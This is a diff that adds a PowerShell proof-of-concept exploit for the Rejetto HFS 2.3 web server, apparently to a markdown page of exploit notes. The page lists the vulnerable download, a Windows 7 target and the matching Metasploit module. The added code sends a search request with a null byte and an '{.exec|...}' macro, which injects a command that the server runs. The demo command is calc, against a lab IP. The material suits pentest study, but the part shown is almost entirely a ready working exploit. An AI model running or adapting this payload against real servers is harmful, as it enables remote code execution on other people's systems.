@@ -84,3 +84,11 @@ s.close()
 Vulnerable Application | OS | Metasploit
 --- | --- | ---
 [HFS](https://liquidtelecom.dl.sourceforge.net/project/hfs/HFS/2.3b/hfs2.3b.zip) | Windows 7 | `use exploit/windows/http/rejetto_hfs_exec`
+
+```powershell
+$rhost = "192.168.56.101"
+$cmd = "calc"
+$request = "http://" + $rhost + "/?search=%00{.exec%7C" + $cmd + ".}"
+Invoke-WebRequest $request
+```
+
